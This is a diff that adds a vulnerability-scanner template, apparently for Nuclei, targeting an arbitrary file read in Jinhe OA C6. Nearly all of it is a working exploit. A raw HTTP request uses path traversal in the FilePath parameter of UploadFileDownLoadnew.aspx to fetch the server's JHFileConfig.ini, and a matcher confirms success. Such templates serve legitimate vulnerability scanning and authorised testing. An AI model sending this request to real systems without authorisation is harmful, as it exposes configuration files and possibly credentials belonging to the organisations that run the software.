@@ -1,0 +1,27 @@
+id: jinhe-c6-UploadFileDownLoadnew-fileread
+
+info:
+  name: 金和OA-C6-任意文件读取-UploadFileDownLoadnew
+  author: HuanXiong
+  severity: medium
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "[JHFile]")'
